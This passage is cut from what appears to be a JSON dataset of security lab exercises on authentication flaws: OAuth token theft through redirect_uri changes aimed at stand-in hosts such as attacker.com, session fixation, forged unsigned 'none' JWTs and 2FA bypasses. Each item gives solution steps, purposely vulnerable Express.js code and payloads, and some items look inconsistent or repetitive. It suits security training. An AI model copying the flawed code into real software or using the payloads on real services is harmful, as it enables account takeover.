    "1. Use Burp Suite to inspect the OAuth login URL. Identify absence of state parameter and use of redirect_uri.",
    "2. Modify redirect_uri to point to your server (e.g., https://evil.com/capture) using Burp Repeater.",
    "3. Send phishing link with modified OAuth URL to the victim (simulate with curl).",
    "4. Capture access_token in your listener (e.g., using Express server with query logging).",
    "5. Replay token in Authorization: Bearer header to /profile endpoint and access victim account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/oauth/callback', (req, res) => { const { access_token } = req.query; if (!access_token) return res.status(400).send('No token'); request.get({ url: 'https://oauth.example.com/userinfo', headers: { Authorization: `Bearer ${access_token}` }}, (err, resp, body) => { if (err) return res.status(500).send('OAuth Error'); res.send(`User Info: ${body}`); }); }); app.listen(4000, () => console.log('OAuth Redirect Lab running on port 4000'));",
  "payloads": [
    "OAuth phishing link: https://auth.app/oauth?client_id=xyz&redirect_uri=https://evil.com/capture&response_type=token",
    "Redirect server log to capture: GET /capture#access_token=abc123",
    "Replay token: Authorization: Bearer abc123"
  ]
},
{
  "Lab scenario": "Session Fixation via SOAP Login Token Mismanagement in Legacy Auth Service",

  "Lab Description": "The application uses a legacy SOAP-based authentication API that improperly binds session tokens before credential verification. The application generates a session cookie as soon as the login page loads, and this session is not invalidated after a successful login. To solve: Fixate a session ID before login, use it to authenticate as the victim, and access their private profile.",

  "Difficulty Level": "Hard",

  "Solution Steps": [
    "1. Using Burp Suite, intercept the initial GET request to /login and capture the Set-Cookie header establishing a session token.",
    "2. With OWASP ZAP, replay the captured request in a new browser session and confirm session reuse prior to authentication.",
    "3. Use Postman to send a crafted SOAP login request using your own credentials and observe that session ID does not change post-login.",
    "4. Replay the same pre-login session ID, but this time POST the victim's credentials via the SOAP envelope, binding the fixed session to them.",
    "5. Use the fixed session ID to access the /soap-profile endpoint and confirm victim's data is shown."

  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const cookieParser = require('cookie-parser'); app.use(cookieParser()); app.use(bodyParser.text({ type: 'application/soap+xml' })); const sessions = {}; const users = [{ username: 'victim', password: 'vpass', profile: 'Sensitive Data' }]; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substring(2); res.cookie('SID', sid); res.send('<loginPage/>'); }); app.post('/soap-auth', (req, res) => { const match = req.body.match(/<username>(.*?)<\\/username>.*<password>(.*?)<\\/password>/); if (!match) return res.status(400).send('Bad Request'); const [_, username, password] = match; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Auth Failed'); sessions[req.cookies.SID] = username; res.send('<authSuccess/>'); }); app.get('/soap-profile', (req, res) => { const user = sessions[req.cookies.SID]; if (!user) return res.status(403).send('Forbidden'); res.send('Profile data for ' + user); }); app.listen(3000);",

  "payloads": [
    "<soap><username>victim</username><password>vpass</password></soap>",
    "GET /login HTTP/1.1 with pre-captured Set-Cookie: SID",
    "Replay /soap-profile with fixed SID"
  ]
},
{
  "Lab scenario": "JWT Authentication Bypass via 'none' Algorithm in GraphQL Login",

  "Lab Description": "This application uses JWTs for user session management via GraphQL login mutation. The backend fails to validate the algorithm field of the JWT. To solve: Tamper with a valid JWT and forge one using 'none' algorithm to impersonate the admin user and access the admin dashboard.",

  "Difficulty Level": "Medium",

  "Solution Steps": [
    "1. Log in using your own credentials and capture the Authorization: Bearer token using Burp Suite.",
    "2. Decode the JWT using jwt.io or Postman Pre-request Scripts to inspect the structure.",
    "3. Modify the token payload to { \"username\": \"admin\" } and change the header to { \"alg\": \"none\" }.",
    "4. Remove the signature part and craft the token as header.payload (omit signature).",
    "5. Use OWASP ZAP to replay the /graphql query to fetch admin data using the forged JWT in Authorization header."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', role: 'admin' }, { username: 'user1', role: 'user' }]; app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (!decoded) return res.status(401).send('Invalid token'); const user = users.find(u => u.username === decoded.payload.username); if (!user) return res.status(403).send('Unauthorized'); res.send({ data: `Welcome ${user.username}, role: ${user.role}` }); }); app.listen(4000);",

  "payloads": [
    "{ \"alg\": \"none\" }.{ \"username\": \"admin\" }.",
    "Authorization: Bearer [forged_jwt]",
    "POST /graphql { query: \"{me{role}}\" }"
  ]
},
{
  "Lab scenario": "OAuth Implicit Flow Token Theft via Redirect URI Manipulation in Login Flow",

  "Lab Description": "The application uses an implicit OAuth flow and accepts user-defined redirect URIs without proper validation. The access token is leaked via the URI fragment. To solve: Inject a malicious redirect URI to steal the access token of the victim and access their account.",

  "Difficulty Level": "Easy",

  "Solution Steps": [
    "1. Use Burp Suite to intercept the /oauth/authorize request and locate the redirect_uri parameter.",
    "2. Modify the redirect_uri to point to your own server or exploit server (e.g., https://attacker.com/callback#token).",
    "3. Send the phishing link to the victim and simulate a login from their end.",
    "4. Capture the access token from the URI fragment sent to your server.",
    "5. Replay a GET /account request using Authorization: Bearer <captured_token> to access the victim's data."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const app = express(); const crypto = require('crypto'); const users = [{ username: 'victim', token: 'abcd1234token' }]; app.get('/oauth/authorize', (req, res) => { const { redirect_uri } = req.query; const token = 'abcd1234token'; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = users.find(u => u.token === token); if (!user) return res.status(403).send('Invalid token'); res.send(`Welcome ${user.username}`); }); app.listen(5000);",

  "payloads": [
    "https://vulnsite.com/oauth/authorize?client_id=abc&redirect_uri=https://attacker.com/callback",
    "Authorization: Bearer abcd1234token",
    "GET /account"
  ]
},
{
  "Lab scenario": "Session fixation via unvalidated session reuse in SOAP login endpoint",
  "Lab Description": "The application's SOAP-based login mechanism incorrectly reuses session identifiers without regenerating them upon authentication. The session ID can be pre-set and persists across login boundaries. The application stores session tokens before authentication and promotes them post-login without invalidation. To solve: Hijack a victim's session by planting a known session ID and force them to authenticate.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept an unauthenticated login request and observe the Set-Cookie header providing a session ID.",
    "Send a crafted SOAP login request with a fixed session ID (e.g., SESSIONID=attackerSession) and confirm it gets reused upon successful login.",
    "Trick the victim into visiting a page that sets the SESSIONID=attackerSession via client-side JavaScript or HTTP header injection.",
    "Once the victim logs in, reuse the known session ID to access their authenticated session.",
    "Verify by visiting the /soap/account-info endpoint with the hijacked session ID and confirm access to the victim’s data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const session = require('express-session'); const app = express(); app.use(bodyParser.text({ type: 'text/xml' })); app.use(session({ secret: 'soap-secret', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/soap-login', (req, res) => { const xml = req.body; const match = xml.match(/<username>(.*?)<\\/username><password>(.*?)<\\/password>/); if (match) { const [_, user, pass] = match; const u = users.find(u => u.username === user && u.password === pass); if (u) { req.session.user = u.username; res.send(`<response>Welcome ${u.username}</response>`); return; } } res.status(403).send('<response>Login failed</response>'); }); app.get('/soap/account-info', (req, res) => { if (req.session.user) return res.send(`Account Info: ${req.session.user}`); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('SOAP Session Fixation lab running on port 4000'));",
  "payloads": [
    "SESSIONID=attackerSession",
    "<?xml version='1.0'?><login><username>carlos</username><password>pass123</password></login>",
    "Access /soap/account-info with SESSIONID=attackerSession"
  ]
},
{
  "Lab scenario": "JWT signature confusion with none algorithm in GraphQL login",
  "Lab Description": "The application uses a JWT token for authentication and accepts tokens passed via a GraphQL mutation. The backend does not enforce algorithm constraints, allowing a forged token using the `none` algorithm. The application accepts unsigned tokens if the header specifies 'alg':'none'. To solve: Forge a valid token for the user 'carlos' and access the GraphQL-protected dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Postman to inspect the GraphQL login mutation and observe the JWT returned after login.",
    "Copy the token and decode it using jwt.io or Burp Decoder. Note the payload structure and claims (e.g., { 'user':'wiener' }).",
    "Craft a forged token with header { 'alg':'none' } and payload { 'user':'carlos' } without signature.",
    "Replace the Authorization header with: Bearer <forged_token> and send a GraphQL query to access protected resources.",
    "Confirm success by querying userData { email } for 'carlos' and seeing valid output."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'password' }]; app.post('/graphql', (req, res) => { const { query, variables } = req.body; if (query.includes('login')) { const user = users.find(u => u.username === variables.username && u.password === variables.password); if (user) { const token = jwt.sign({ user: user.username }, 'jwt-secret', { algorithm: 'HS256' }); return res.json({ data: { login: token } }); } return res.status(403).send('Login failed'); } if (req.headers.authorization) { const token = req.headers.authorization.split(' ')[1]; try { const decoded = jwt.verify(token, 'jwt-secret'); if (decoded.user) return res.json({ data: { userData: { email: decoded.user + '@lab.local' } } }); } catch (e) { return res.status(403).send('Invalid token'); } } res.status(400).send('Bad request'); }); app.listen(4000, () => console.log('JWT None Algorithm lab running on port 4000'));",
  "payloads": [
    "Header: { \"alg\": \"none\" }",
    "Payload: { \"user\": \"carlos\" }",
    "JWT: base64url(header).base64url(payload).",
    "Authorization: Bearer <forged_token>"
  ]
},
{
  "Lab scenario": "OAuth client misconfiguration leads to token reuse",
  "Lab Description": "The application relies on a third-party OAuth 2.0 provider for authentication. However, it reuses access tokens across clients without verifying the `aud` or `client_id` fields. This enables attackers to use access tokens from other apps to impersonate users. To solve: Acquire a valid OAuth token from your test app and reuse it on this site to gain access to Carlos’s account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to intercept the login process and observe the OAuth flow with the Authorization header.",
    "Identify the lack of token validation for `client_id` or audience claim by submitting a token from a separate registered app.",
    "Obtain a valid OAuth access token from your own app using client credentials grant or implicit flow.",
    "Send a request to /oauth/profile with Authorization: Bearer <your_token>.",
    "Observe that the server accepts the token and returns user data, indicating the client identity wasn't verified. Change sub to carlos and re-sign if applicable."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.get('/oauth/profile', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token); // no audience or client_id checks if (decoded && decoded.sub) return res.send(`User profile for ${decoded.sub}`); return res.status(403).send('Invalid token structure'); } catch (e) { return res.status(403).send('Token error'); } }); app.listen(4000, () => console.log('OAuth Token Reuse lab running on port 4000'));",
  "payloads": [
    "Bearer <access_token_from_attacker_app>",
    "JWT payload: { \"sub\": \"carlos\", \"aud\": \"attacker-app\" }",
    "No verification of client_id in backend"
  ]
},
{
  "Lab scenario": "Session Fixation via Cookie Injection in OAuth Callback Handler",
  "Lab Description": "This lab's OAuth callback implementation is vulnerable to session fixation. The application does not regenerate the session upon login via OAuth. Instead, it continues using any pre-authentication session value. To solve: Fixate a session ID, then log in as the victim via OAuth, and hijack their session using the fixed cookie.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite's Proxy to initiate a login flow and capture a session cookie before any authentication.",
    "2. Observe that the session ID remains unchanged after logging in with your own account via OAuth.",
    "3. Send the GET /auth/callback request to Burp Repeater and manually inject the pre-auth session ID as a cookie.",
    "4. Use Burp Collaborator or Intercept to force the victim to visit a crafted OAuth URL that preserves the fixed session cookie.",
    "5. After victim login, reuse the fixed session cookie to access their account dashboard."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 's3cr3t', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { const authUrl = 'https://oauth.provider.com/auth?client_id=123&redirect_uri=http://localhost:4000/auth/callback'; res.redirect(authUrl); }); app.get('/auth/callback', (req, res) => { const userInfo = { username: 'carlos' }; req.session.user = userInfo; console.log('[DEBUG] Auth callback session:', req.session); res.redirect('/dashboard'); }); app.get('/dashboard', (req, res) => { if (!req.session.user) return res.status(401).send('Unauthorized'); res.send('Welcome to your dashboard, ' + req.session.user.username); }); app.listen(4000, () => console.log('OAuth Session Fixation Lab running'));",
  "payloads": [
    "Set-Cookie: connect.sid=sess:fixed123",
    "https://labsite.com/auth/callback?code=xyz (with injected session ID)",
    "Burp Collaborator + social engineering redirect to /auth/callback"
  ]
},
{
  "Lab scenario": "JWT None Algorithm Bypass in GraphQL Login API",
  "Lab Description": "This lab uses JSON Web Tokens to protect user sessions. However, the backend incorrectly allows tokens signed with the 'none' algorithm. To solve: Forge a JWT with 'alg':'none' and impersonate the victim user to access their GraphQL profile.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Postman to perform a valid login and retrieve your JWT from the Authorization header.",
    "2. Decode the JWT in jwt.io or Burp Decoder and observe the algorithm field.",
    "3. Replace the JWT header with {\"alg\":\"none\",\"typ\":\"JWT\"} and payload with {\"username\":\"carlos\"}.",
    "4. Remove the signature completely and send the token via Authorization: Bearer header to /graphql.",
    "5. Query the victim’s profile using: { userProfile { username, email, balance } }"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'mysecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); console.log('[DEBUG] Issued JWT:', token); res.json({ token }); }); app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.header.alg === 'none') { const user = { username: req.body.query.includes('carlos') ? 'carlos' : 'anonymous' }; return res.json({ data: { userProfile: { username: user.username, email: user.username + '@example.com', balance: 100 } } }); } try { const verified = jwt.verify(token, SECRET); res.json({ data: { userProfile: { username: verified.username, email: verified.username + '@example.com', balance: 100 } } }); } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Bypass Lab running'));",
  "payloads": [
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
    "{ userProfile { username, email, balance } }",
    "Authorization: Bearer <none-alg-token>"
  ]
},
{
  "Lab scenario": "SOAP API Key Leakage via Verbose Debugging in MFA Bypass",
  "Lab Description": "This lab uses a SOAP API for multi-factor authentication. The application logs sensitive API keys in verbose mode. By inducing an error during MFA verification, an attacker can leak the victim’s API key. To solve: Trigger the debug message, extract the key, and bypass MFA for the victim.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use OWASP ZAP to intercept the SOAP MFA login request and replay it with a malformed payload.",
    "2. Analyze the HTTP 500 error response containing the verbose debug trace leaking 'apiKey' for the victim.",
    "3. Replay the correct SOAP request with the leaked API key and valid credentials to bypass MFA.",
    "4. Access the SOAP getUserProfile operation with victim credentials and leaked key.",
    "5. Confirm successful bypass by querying the MyAccount page."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const morgan = require('morgan'); app.use(bodyParser.text({ type: 'text/xml' })); app.use(morgan('dev')); app.post('/soap-mfa', (req, res) => { try { if (req.body.includes('<Username>carlos</Username>') && req.body.includes('<ApiKey>DEBUG_LEAK_KEY</ApiKey>')) { res.send('<soap:Envelope><soap:Body><AuthResult>Success</AuthResult></soap:Body></soap:Envelope>'); } else if (req.body.includes('<Username>carlos</Username>')) { throw new Error('Missing or invalid API key for user carlos - DEBUG: expected ApiKey=DEBUG_LEAK_KEY'); } else { res.status(403).send('<soap:Envelope><soap:Body><AuthResult>Failure</AuthResult></soap:Body></soap:Envelope>'); } } catch (e) { console.log('[DEBUG] Exception:', e.message); res.status(500).send(e.message); } }); app.listen(4000, () => console.log('SOAP MFA Bypass Lab running'));",
  "payloads": [
    "<?xml version=\"1.0\"?><soap:Envelope><soap:Body><MFARequest><Username>carlos</Username><ApiKey>DEBUG_LEAK_KEY</ApiKey></MFARequest></soap:Body></soap:Envelope>",
    "<?xml version=\"1.0\"?><soap:Envelope><soap:Body><MFARequest><Username>carlos</Username></MFARequest></soap:Body></soap:Envelope>",
    "500 error leak: Missing or invalid API key for user carlos - DEBUG: expected ApiKey=DEBUG_LEAK_KEY"
  ]
},
{
  "Lab scenario": "Session Fixation in REST API session management",
  "Lab Description": "The application uses predictable session tokens stored in a REST cookie without invalidation upon login. The vulnerable login process does not reset the session token after authentication. To solve: Fixate a session and hijack Carlos's authenticated session using the same token.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept login flow in Burp Suite using Proxy and identify the session cookie behavior.",
    "Use OWASP ZAP to confirm that session cookie remains unchanged before and after login.",
    "Manually send a GET /login request to establish a session and capture the session cookie.",
    "Send a crafted phishing link containing the session ID to Carlos (simulated).",
    "Once Carlos logs in, reuse the same session cookie to access /my-account endpoint."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); const users = [{ username: 'carlos', password: 's3cret' }]; app.use(session({ secret: 'insecureSecret', resave: false, saveUninitialized: true })); app.use(express.urlencoded({ extended: true })); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.authenticated = true; req.session.username = username; console.log(`[DEBUG] User ${username} logged in using session ID ${req.session.id}`); res.redirect('/my-account'); } else res.status(401).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { if (req.session.authenticated) res.send(`Account page of ${req.session.username}`); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "GET /login -> extract session cookie",
    "Session cookie: sessionid=fixatedSession123",
    "Use session cookie after Carlos logs in: GET /my-account"
  ]
},
{
  "Lab scenario": "JWT None Algorithm Bypass in GraphQL auth mutation",
  "Lab Description": "The application uses JWT to protect a GraphQL mutation-based login but accepts the 'none' algorithm for tokens. To solve: Forge a valid token by removing the signature and gain access to the admin GraphQL endpoint.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to capture the Authorization header on login mutation.",
    "Decode the JWT using jwt.io and confirm 'alg':'none' is accepted.",
    "Craft a JWT token with 'alg':'none' and payload {\"username\":\"carlos\",\"role\":\"admin\"}.",
    "Send the token via Authorization: Bearer <crafted_token> in a GraphQL POST request.",
    "Query the getAdminData endpoint using Postman with the forged JWT to confirm access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'hardcodedsecret'; app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.role === 'admin') return res.send({ data: 'Sensitive admin content' }); res.status(403).send('Access denied'); } catch (err) { console.log('[DEBUG] JWT Error:', err.message); res.status(401).send('Invalid token'); } }); app.listen(4000);",
  "payloads": [
    "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
    "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
    "JWT: base64(header).base64(payload).",
    "Authorization: Bearer [token]"
  ]
},
{
  "Lab scenario": "OAuth token hijack via open redirect URI",
  "Lab Description": "The application uses OAuth 2.0 for authentication, but the token redirect URI is improperly validated. This allows attackers to hijack access tokens. To solve: Craft a redirect URI to leak Carlos's token and use it to access protected resources.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept the OAuth authorization flow and inspect the redirect_uri.",
    "Modify the redirect_uri to point to your controlled domain (e.g., attacker.com).",
    "Simulate Carlos initiating OAuth login using this crafted URL.",
    "Capture the leaked access_token in your attacker server logs.",
    "Replay the access_token in the Authorization header to access /my-account API."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const tokens = {}; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, state } = req.query; const token = 'token-' + Math.random().toString(36).substring(7); tokens['carlos'] = token; console.log(`[DEBUG] Issued token ${token} for redirect URI ${redirect_uri}`); res.redirect(`${redirect_uri}#access_token=${token}&state=${state}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (Object.values(tokens).includes(token)) res.send('Carlos account data'); else res.status(403).send('Forbidden'); }); app.listen(4000);",
  "payloads": [
    "GET /oauth/authorize?redirect_uri=https://attacker.com/callback&state=xyz",
    "Intercept token in attacker.com logs",
    "GET /my-account with Authorization: Bearer token-xxxx"
  ]
},
{
  "Lab scenario": "2FA bypass via duplicate parameters in SOAP login request",
  "Lab Description": "A SOAP-based login API expects a 2FA code, but fails when multiple <2faCode> elements are submitted. The first one is ignored, and the second is trusted. To solve: Inject duplicate 2FA parameters and force authentication without a valid code.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use OWASP ZAP to proxy a SOAP login request and extract the WSDL and SOAP body.",
    "Send the login request to Burp Repeater and test with valid credentials but invalid 2FA code.",
    "Add a second <2faCode> element after the first, leaving the second one empty.",
    "Observe that the backend uses the last occurrence, bypassing validation.",
    "Replay the bypass request and confirm access to /my-account endpoint."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const xmlparser = require('express-xml-bodyparser'); const app = express(); app.use(xmlparser()); const users = [{ username: 'carlos', password: 'admin', code: '654321' }]; app.post('/soap-login', (req, res) => { const body = req.body['soapenv:Envelope']['soapenv:Body'][0]; const { username, password, '2faCode': code } = body.loginRequest[0]; if (username[0] === 'carlos' && password[0] === 'admin' && code[0] === '654321') res.send('<success>Logged in</success>'); else res.status(403).send('<error>Invalid login</error>'); }); app.get('/my-account', (req, res) => { res.send('Carlos account info'); }); app.listen(4000);",
  "payloads": [
    "<2faCode>invalid</2faCode><2faCode></2faCode>",
    "SOAPAction: /soap-login",
    "Username: carlos, Password: admin"
  ]
},
{
  "Lab scenario": "Session Fixation in legacy SOAP endpoint",
  "Lab Description": "The application uses a legacy SOAP authentication endpoint vulnerable to session fixation. The session ID can be preset and is accepted post-login. The application does not regenerate session tokens upon authentication. To solve: fix a session ID, authenticate as Carlos, and access his dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to intercept the GET /login request and observe the Set-Cookie header.",
    "Send a crafted SOAP login request using Postman with the JSESSIONID manually set to the fixed value.",
    "Submit the SOAP authentication request as Carlos with known credentials.",
    "Verify that the server accepts the fixed JSESSIONID without regenerating it post-login.",
    "Use the fixed session cookie to access /dashboard as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const soap = require('soap'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'carpass' }]; app.post('/soap-auth', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) req.session.username = username; res.send(`<response>Login successful</response>`); }); app.get('/dashboard', (req, res) => { if (req.session.username === 'carlos') res.send('Welcome Carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "<soap:Envelope><soap:Body><Login><username>carlos</username><password>carpass</password></Login></soap:Body></soap:Envelope>",
    "Cookie: JSESSIONID=FIXED123",
    "POST /soap-auth with pre-set JSESSIONID"
  ]
},
{
  "Lab scenario": "JWT tampering in GraphQL login resolver",
  "Lab Description": "The GraphQL login resolver issues JWT tokens signed with the 'none' algorithm when 'alg' is tampered in the header. The backend uses a misconfigured JWT library that does not enforce algorithm validation. To solve: craft a JWT with 'alg':'none', impersonate Carlos, and access /profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to query the GraphQL login resolver with your credentials and observe the JWT structure.",
    "Decode the JWT using jwt.io and inspect its header and payload.",
    "Create a new JWT with 'alg':'none' and 'username':'carlos', leaving signature blank.",
    "Send the forged JWT in Authorization: Bearer header to /profile endpoint.",
    "Verify access to Carlos's profile."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/graphql', (req, res) => { const { query } = req.body; if (query.includes('login')) { const token = jwt.sign({ username: 'carlos' }, 'secret'); res.json({ data: { token } }); } }); app.get('/profile', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(auth, { complete: true }); if (decoded?.payload?.username === 'carlos') res.send('Carlos Profile'); else res.status(403).send('Access Denied'); }); app.listen(4000);",
  "payloads": [
    "{ \"alg\": \"none\" }.{ \"username\": \"carlos\" }.",
    "Authorization: Bearer [forged-token]",
    "GraphQL query: mutation { login(username: \"wiener\", password: \"test\") }"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in redirect_uri",
  "Lab Description": "The application implements OAuth Implicit Grant but fails to validate redirect_uri strictly. It allows open redirect injection, enabling token capture. To solve: trick the auth server to redirect Carlos's token to your server and access his profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to analyze the OAuth authorization URL and notice insufficient redirect_uri validation.",
    "Craft a malicious redirect_uri to your attacker-controlled server (e.g., https://attacker.com/capture).",
    "Trick Carlos into visiting the malicious OAuth URL via phishing or reflection injection.",
    "Capture the access_token from the redirected URL fragment.",
    "Replay the token in Authorization header to access /user/profile as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const token = 'carlos-access-token'; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-access-token') res.send('Carlos Profile'); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "https://vulnerable.com/auth?redirect_uri=https://attacker.com/capture",
    "Captured token: carlos-access-token",
    "Authorization: Bearer carlos-access-token"
  ]
},
{
  "Lab scenario": "Session ID leakage in verbose debug logs",
  "Lab Description": "The application exposes internal debug logs via a REST endpoint. These logs contain session tokens in plaintext due to poor log filtering. To solve: extract Carlos’s session ID from logs and use it to access /my-account.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "Use Burp Suite to access the /debug/logs REST endpoint.",
    "Search for session tokens and correlate them with Carlos's login attempts.",
    "Identify a valid session token assigned to Carlos from the logs.",
    "Replay a GET /my-account request with Cookie: session=<carlos_token>.",
    "Confirm access to Carlos’s account page."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); const logs = []; app.use(session({ secret: 'debug-secret', saveUninitialized: true, resave: false })); app.post('/login', (req, res) => { const { username } = req.body; req.session.user = username; logs.push(`[DEBUG] Login by ${username}, session: ${req.session.id}`); res.send('Logged in'); }); app.get('/debug/logs', (req, res) => { res.send(logs.join('\\n')); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Carlos Account'); else res.status(403).send('Forbidden'); }); app.listen(4000);",
  "payloads": [
    "GET /debug/logs",
    "Extracted: session=abcd123carlos",
    "Cookie: session=abcd123carlos"
  ]
},
{
  "Lab scenario": "Session Fixation in Legacy Cookie Management via REST Login",
  "Lab Description": "The application uses legacy cookie-based session management without proper regeneration of session identifiers after login. The session cookie is issued pre-authentication and persists after login without changes. To solve: Fixate a session ID pre-login, then log in as the victim using that ID to hijack their session.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept a GET /login request using Burp Suite to extract the Set-Cookie header and capture the pre-auth session ID.",
    "Verify that logging in does not rotate the session cookie by logging in with your credentials while preserving the original cookie.",
    "Craft a phishing-style exploit where the victim logs in while fixated to your session ID. Simulate this by sending a login request with victim credentials and your pre-captured cookie using Burp Repeater.",
    "After login, issue a GET /my-account request with the same cookie to verify session takeover.",
    "Confirm access to victim’s account page using the hijacked session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'legacysecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); req.session.authenticated = true; req.session.user = username; res.send('Login successful'); }); app.get('/my-account', (req, res) => { if (req.session.authenticated) return res.send('Account details for ' + req.session.user); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab on http://localhost:4000'));",
  "payloads": [
    "Reuse pre-authentication cookie after victim login",
    "Fixate session ID via phishing link",
    "GET /my-account with hijacked session ID"
  ]
},
{
  "Lab scenario": "JWT None Algorithm Tampering in GraphQL Login Token",
  "Lab Description": "The application uses JWTs for authentication with user-supplied tokens via Authorization headers. The token signature verification logic fails to enforce a valid signing algorithm. To solve: Forge a JWT using 'alg':'none' and impersonate the victim by submitting it to a protected GraphQL query.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to perform a GraphQL login mutation and inspect the returned JWT in the Authorization header.",
    "Decode the JWT in jwt.io and observe it uses HS256 or RS256 with a signed payload.",
    "Forge a new token using the same payload but with alg set to 'none' and remove the signature section entirely.",
    "Submit the tampered token in the Authorization header and perform a GraphQL query like { me { username, email } }.",
